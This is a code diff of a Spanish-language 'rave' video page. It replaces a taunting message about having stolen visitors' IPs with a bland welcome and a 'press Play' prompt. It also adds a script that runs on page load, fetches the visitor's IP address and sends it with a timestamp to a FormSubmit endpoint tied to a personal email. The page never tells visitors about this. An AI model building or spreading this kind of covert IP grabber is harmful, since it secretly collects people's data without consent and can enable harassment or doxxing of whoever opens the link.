@@ -3,17 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TU IP Y DATOS A SIDO ROBADA POR LAUTY33 REYYY</title>
+    <title>Página de Prueba - Te Vas Trackeado</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
             padding-top: 50px;
-            background-color: #121212; /* Fondo oscuro de rave/club */
-            color: #E0E0E0; /* Letras claras */
+            background-color: #121212; /* Fondo oscuro */
+            color: #E0E0E0;
         }
         h1 {
-            color: #00ff99; /* Color neón */
+            color: #00ff99; /* Neón */
             text-shadow: 0 0 10px rgba(0, 255, 153, 0.7);
             margin-bottom: 5px;
         }
@@ -22,7 +22,7 @@
             margin-top: 5px;
         }
         video {
-            border: 5px solid #ff00ff; /* Borde magenta neón */
+            border: 5px solid #ff00ff; /* Neón magenta */
             box-shadow: 0 0 20px rgba(255, 0, 255, 0.8);
             border-radius: 8px;
             margin-top: 20px;
@@ -30,16 +30,43 @@
     </style>
 </head>
 <body>
-    <h1>USUARIO DE RAVE: TE VAS TRACKEADO</h1>
-    <p>Papi 33 y papi 32 tienen tu ip ahora :).</p>
+    <h1>BIENVENIDO AL RAVE: TE VAS TRACKEADO</h1>
+    <p>Presiona Play para iniciar la secuencia de 10 segundos.</p>
 
     <video width="720" controls> 
       <source src="clip.mp4" type="video/mp4">
       Tu navegador no puede reproducir este video.
     </video>
 
-    <p>TOMAS SISHOSA</p>
-</body>
+    <p>URL: https://capture-tu-ip.github.io/TeVasTrackeado/</p>
+
+    <script>
+        // 1. Obtener la IP del usuario a través de la API ipify
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;
+                
+                // 2. Definir el punto de recolección (FormSubmit)
+                // Se usa %40 para representar el @ en la URL
+                const endpoint = 'https://formsubmit.co/ajax/system404g%40gmail.com'; 
+                
+                // 3. Enviar la IP al servidor de FormSubmit
+                fetch(endpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        "IP_Visitante": userIP, 
+                        "Fecha_Hora_Visita": new Date().toLocaleString(),
+                        "_subject": "IP Capturada en TeVasTrackeado" 
+                    })
+                })
+                .catch(error => console.log('Error al enviar la IP: ' + error)); // Manejo de errores
+            })
+            .catch(error => console.log('Error al obtener la IP: ' + error));
+    </script>
+    </body>
 </html>
-
-
